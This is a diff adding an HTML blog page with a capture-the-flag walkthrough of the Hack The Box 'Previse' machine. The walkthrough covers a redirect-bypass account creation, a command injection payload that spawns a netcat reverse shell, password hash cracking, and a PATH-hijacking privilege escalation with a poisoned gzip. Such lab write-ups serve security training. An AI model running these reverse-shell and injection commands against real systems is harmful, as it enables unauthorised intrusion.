@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GTPQRVRV1B"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'G-GTPQRVRV1B');
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <link rel="icon" href="/peacefool/favicon.png" />
+    <title>
+        HTB Previse w/o Metasploit
+    </title>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="/peacefool/css/spectre/spectre.min.css">
+    <link rel="stylesheet" href="/peacefool/css/spectre/spectre-exp.min.css">
+    <link rel="stylesheet" href="/peacefool/css/spectre/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    <link rel="stylesheet" href="/peacefool/css/book.css">
+    <script src="/peacefool/js/book.js"></script>
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css">
+</head>
+
+<body>
+    <div id="navbar" class="#">
+        <div class="card topnav">
+            <div class="book-navbar">
+                <header class="navbar">
+                    <section class="navbar-section">
+                        <a onclick="open_sidebar()">
+                            <i class="icon icon-menu"></i>
+                        </a>
+                    </section>
+                </header>
+            </div>
+        </div>
+    </div>
+
+    <div class="book-container">
+
+        <!-- left side bar -->
+        <div class="book-sidebar">
+            <div class="container">
+                <div class="columns">
+                    <div class="column col-5 side-blank"></div>
+                    <div class="column col-7">
+                        <div class="book-brand">
+                            <a href="/peacefool/">
+                                <!-- <img src="pp.png"> -->
+                                <h3>Infosec Blog</h3>
+                            </a>
+                        </div>
+                        <!-- side nav -->
+                        <div class="book-menu">
+                            <ul>
+                                <li><a href="/peacefool/">Home</a></li>
+                            </ul>
+                            <h1 id="Categories">
+                                <a href="#" class="headerlink" title="Categories"></a>
+                                Categories
+                            </h1>
+                            <h2 id="Hack-The-Box-Write-ups">
+                                <a href="#" class="headerlink" title="Hack The Box Write-ups"></a>
+                                Write-ups
+                            </h2>
+                            <ul>
+                                <li><a href="/peacefool/htb/first.html">One</a></li>
+                                <!-- <li><a href="/peacefool/htb/two.html">Two</a></li> -->
+                                <!-- <li><a href="#">Three</a></li> -->
+                            </ul>
+                            <h2 id="Wizard-Labs-Write-ups">
+                                <a href="#" class="headerlink" title="Wizard Labs Write-ups"></a>
+                                HTB Active Boxes
+                            </h2>
+                            <ul>
+                                <li><a href="/peacefool/activebox/Previse/Previse.html">Previse w/o Metasploit</a></li>
+                                <!-- <li><a href="/peacefool/activebox/Two/two.html">Two</a></li> -->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <script src="/peacefool/js/book-menu.js"></script>
+        </div>
+
+        <div class="off-canvas-content">
+            <div class="columns">
+                <div class="column col-8 col-lg-12">
+                    <div class="book-content">
+                        <div class="book-post">
+                            <!-- content start -->
+                            <h1 id="Heading">HTB Previse w/o Metasploit</h1>
+                            <img src="/peacefool/activebox/Previse/previse.png" alt="HackTheBox Previse Machine">
+                            <h2 id="recon">Reconnaissance</h2>
+                            <p>First, we run nmap scan to check for open ports and the service running on them.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">nmap -sC -sV -A -oN nmap 10.10.11.104
+</pre>
+                                </div>
+                            </div>
+                            <ul>
+                                <li>
+                                    <p><b>-sC :</b> default script scanning</p>
+                                </li>
+                                <li>
+                                    <p><b>-sV :</b> service version scanning</p>
+                                </li>
+                                <li>
+                                    <p><b>-A :</b> aggressive scanning</p>
+                                </li>
+                                <li>
+                                    <p><b>-oN :</b> output normal format and store in filename 'nmap'</p>
+                                </li>
+                            </ul>
+                            <p>We see 2 ports are open:</p>
+                            <ul>
+                                <li>
+                                    <p><b>Port 22 :</b> ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</p>
+                                </li>
+                                <li>
+                                    <p><b>Port 80 :</b> http Apache httpd 2.4.29</p>
+                                </li>
+                            </ul>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">Nmap scan report for 10.10.11.104
+Host is up (0.12s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Previse Login
+|_Requested resource was login.php
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+                                </div>
+                            </div>
+                            <p>Mental Notes:</p>
+                            <ol>
+                                <li>
+                                    ssh is usually not the point of entry. we can generally skip searching for ssh
+                                    exploits unless we have a really really old ssh version running or ssh 6.6, other
+                                    than that ssh is pretty solid.
+                                </li>
+                                <li>
+                                    Apache 2.4.29 seems to have an exploit "CVE-2019-0211" for local privilege
+                                    escalation but it is a time-specific exploit where we need to wait for 6:25 AM to
+                                    work. We can skip further research on this as of now.
+                                </li>
+                            </ol>
+
+                            <h2 id="enum">Enumeration</h2>
+
+                            <p>Visiting the site on browser.</p>
+                            <img src="/peacefool/activebox/Previse/1.png" alt="Login Page/Landing Page">
+                            <p>We don't have any credentials to work with right now.</p>
+                            <p>Let's run a quick gobuster scan to find if there are any other pages of interest.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">gobuster dir -u 10.10.11.104 -w /usr/share/wordlists/dirb/common.txt
+</pre>
+                                </div>
+                            </div>
+                            <p>Result :</p>
+                            <img src="/peacefool/activebox/Previse/2.png" alt="Gobuster Result">
+                            <p>Here index.php is being redirected to login.php</p>
+                            <p>Let's Intercept the request to index.php with burp.</p>
+                            <img src="/peacefool/activebox/Previse/3.png" alt="Burpsuite Request Intercept">
+                            <p>Following the request in Burp repeater, we can see that the website uses redirection to
+                                the login page as an Access Control mechanism.</p>
+                            <p>We also found some interesting links in the above response.</p>
+                            <p>Let's check accounts.php</p>
+                            <img src="/peacefool/activebox/Previse/4.png"
+                                alt="Intercepting accounts page with Burpsuite">
+                            <p>It seems like we can add a new account for ourselves.</p>
+                            <p>We can do this in 2 ways :</p>
+                            <h3 id="metone">Method 1 :</h3>
+                            <p>Making a POST request at /accounts.php</p>
+                            <p>Remember to add these lines:</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">POST /accounts.php HTTP/1.1
+
+Content-Type: application/x-www-form-urlencoded
+                                        
+username=[name]&password=[password]&confirm=[password]&submit
+</pre>
+                                </div>
+                            </div>
+                            <img src="/peacefool/activebox/Previse/5.png" alt="Adding a user by making a POST request">
+                            <h3 id="mettwo">Method 2 :</h3>
+                            <ol>
+                                <li>
+                                    Intercept /accounts.php request.
+                                </li>
+                                <li>
+                                    Right-click > Do Intercept > Response to this request.
+                                </li>
+                                <li>
+                                    Forward the request.
+                                </li>
+                            </ol>
+                            <img src="/peacefool/activebox/Previse/6.png"
+                                alt="Intercepting account page request with burpsuite">
+                            <p>Change "302 Found" to "200 OK" and forward the request.</p>
+                            <img src="/peacefool/activebox/Previse/7.png"
+                                alt="Modifing and forwarding account page request with burpsuite">
+                            <blockquote>
+                                <p><code>302 Found</code> redirect status response code indicates that the resource
+                                    requested has been temporarily moved to the URL given by the Location header.</p>
+                                <p><code>200 OK</code> success status response code indicates that the request has
+                                    succeeded. A 200 response is cacheable by default.</p>
+                            </blockquote>
+                            <p>Add an account and log in.</p>
+                            <img src="/peacefool/activebox/Previse/8.png" alt="logging in with our credentials">
+                            <p>Once in, we can look around different pages. In the Files tab, we can find
+                                SITEBACKUP.ZIP, which we can download.</p>
+                            <img src="/peacefool/activebox/Previse/9.png" alt="downloading sitebackup.zip file">
+                            <p>Looking inside the files, I come across config.php, which has MySQL credentials
+                                hardcoded.</p>
+                            <p>This will be useful later on.</p>
+                            <img src="/peacefool/activebox/Previse/10.png"
+                                alt="unziping and exploring sitebackup.zip, looking at config.php file">
+                            <p>Digging in further, I find logs.php</p>
+                            <p>Here we can see, the website uses the exec() command which uses unsanitized input
+                                parameters.</p>
+                            <img src="/peacefool/activebox/Previse/11.png"
+                                alt="looking at logs.php file to find a code injection vulnerability">
+                            <h2 id="user">Gaining an Initial Foothold</h2>
+                            <p>We can intercept the request from the file_logs.php page with burp and inject a reverse
+                                shellcode.</p>
+                            <p>Start a Netcat listener.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">nc -lnvp 4444
+</pre>
+                                </div>
+                            </div>
+                            <p>Reverse shellcode :</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">; nc [your ip] 4444 -e /bin/bash
+</pre>
+                                </div>
+                            </div>
+                            <p>URL encode the above code before forwarding the request.</p>
+                            <blockquote>
+                                <p>Select the code and press <code>Ctrl+u</code> to URL encode it.</p>
+                            </blockquote>
+                            <img src="/peacefool/activebox/Previse/12.png"
+                                alt="Spawnning a reverse shell from code injection">
+                            <p>We are in as www-data</p>
+                            <p>Let's improve our shell a bit</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">python -c 'import pty;pty.spawn("/bin/bash")'
+</pre>
+                                </div>
+                            </div>
+                            <p>file user.txt is still inaccessible. We need to switch to a user account.</p>
+                            <p>We can use the MySQL credentials we found in config.php to access the database. Maybe we
+                                can find something interesting there.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">mysql -u root -D previse -p
+Enter password: mySQL_p@ssw0rd!:)
+</pre>
+                                </div>
+                            </div>
+                            <img src="/peacefool/activebox/Previse/13.png"
+                                alt="finding hashed credentials in mysql database">
+                            <p>Let's crack the hash!</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt ./hash
+</pre>
+                                </div>
+                            </div>
+                            <img src="/peacefool/activebox/Previse/14.png"
+                                alt="cracking the hashed password with john the ripper">
+                            <p>We can now ssh into the machine with the above credentials.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">ssh m4lwhere@10.10.11.104
+</pre>
+                                </div>
+                            </div>
+                            <p>Enter the password when prompted and we are in!</p>
+                            <p>Let's get the user.txt flag.</p>
+                            <img src="/peacefool/activebox/Previse/15.png" alt="user credentials">
+                            <h2 id="privesc">Privilege Escalation</h2>
+                            <p>Let's first list out the sudo commands for our user.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">sudo -l
+</pre>
+                                </div>
+                            </div>
+                            <img src="/peacefool/activebox/Previse/16.png"
+                                alt="sudo commands available to user account">
+                            <p>We have sudo permissions for a shell script. Let's see its content.</p>
+                            <img src="/peacefool/activebox/Previse/17.png"
+                                alt="checking the content of access_backup.sh file">
+                            <p>The script uses gzip command. Since it uses a relative path we can modify the $PATH
+                                variable to include a path to a directory of which we have write permissions (Example:
+                                /tmp).</p>
+                            <img src="/peacefool/activebox/Previse/18.png" alt="Changing PATH in our machine">
+                            <p>There we can create a new poisoned gzip binary and execute access_backup.sh file.</p>
+                            <p>First, let's run a Netcat listener.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">nc -lnvp 4242
+</pre>
+                                </div>
+                            </div>
+                            <p>Now we create a binary named 'gzip' and make it executable.</p>
+                            <!-- Code Snippet -->
+                            <div class="card s-rounded code-card">
+                                <div class="card-body">
+                                    <pre class="code-p">echo "nc [your ip] 4242 -e /bin/bash" > gzip
+chmod +x gzip
+sudo /opt/scripts/access_backup.sh
+</pre>
+                                </div>
+                            </div>
+                            <img src="/peacefool/activebox/Previse/19.png"
+                                alt="reverse netcat shell to our attack machine">
+                            <p>We are root!</p>
+                            <p>Let's grab the root flag.</p>
+                            <img src="/peacefool/activebox/Previse/20.png" alt="root flag">
+
+                            <!-- content end -->
+                        </div>
+                        <br>
+                        <!-- pagination -->
+                        <!-- <div class="columns col-oneline col-gapless pagination">
+                            <div class="column col-6 pag">
+                                <a href="/peacefool/htb/first.html">
+                                    <div class="card card-2">
+                                        <div class="columns">
+                                            <div class="column col-1"><i class="icon icon-back"></i></div>
+                                            <div class="column col-11 text-right">First</div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </div>
+                            <div class="column col-6 pag">
+                                <a href="/peacefool/activebox/One/one.html">
+                                    <div class="card card-2">
+                                        <div class="columns">
+                                            <div class="column col-11">One</div>
+                                            <div class="column col-1 text-right"><i class="icon icon-forward"></i></div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </div>
+                        </div> -->
+
+                        <div class="book-comments"></div>
+                    </div>
+                </div>
+                <!-- rsidebar -->
+                <div class="column col-4 hide-lg col-mx-auto">
+                    <div class="book-post-info">
+                        <div class="book-post-meta">
+                            <div class="author">
+                                <!-- Author image -->
+                                <div class="author-img">
+                                    <figure class="avatar avatar-lg">
+                                        <img src="/peacefool/pp.png" alt="...">
+                                    </figure>
+                                </div>
+                                <!-- Author title -->
+                                <div class="author-title">
+                                    <div>peace_fool</div>
+                                </div>
+                            </div>
+                            <div class="divider"></div>
+                            <div class="link">
+                                <h6>Content</h6>
+                            </div>
+                            <div class="divider"></div>
+                        </div>
+                        <div class="book-tocbot"></div>
+                        <div class="book-tocbot-menu">
+                            <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+                            <a onclick="go_top()"><i class="icon icon-upward"></i>&#160;&#160;Back to top</a>
+                            <a onclick="go_bottom()"><i class="icon icon-downward"></i>&#160;&#160;Go to bottom</a>
+                        </div>
+                        <script src="/peacefool/js/book-toc.js"></script>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+    </div>
+    <script src="/peacefool/js/book.js"></script>
+</body>
+
+</html>
